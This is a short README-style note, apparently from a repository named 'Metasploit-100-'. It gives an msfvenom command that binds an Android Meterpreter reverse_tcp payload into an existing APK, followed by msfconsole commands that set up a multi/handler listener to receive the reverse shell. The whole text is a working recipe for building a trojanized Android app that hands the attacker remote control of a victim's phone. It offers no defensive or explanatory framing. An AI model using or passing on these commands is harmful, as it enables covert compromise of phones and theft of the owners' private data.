# Metasploit-100-

## paylod:-


msfvenom -x (bind apk name) -p android/meterpreter/reverse_tcp LHOST= LPORT= R > /sdcard/apk_name.apk




## RAN WAY


msfconsole

use multi/handler 

set payload android/meterpreter/reverse_tcp 

set lhost (your ip) 

set lport (port number)

run
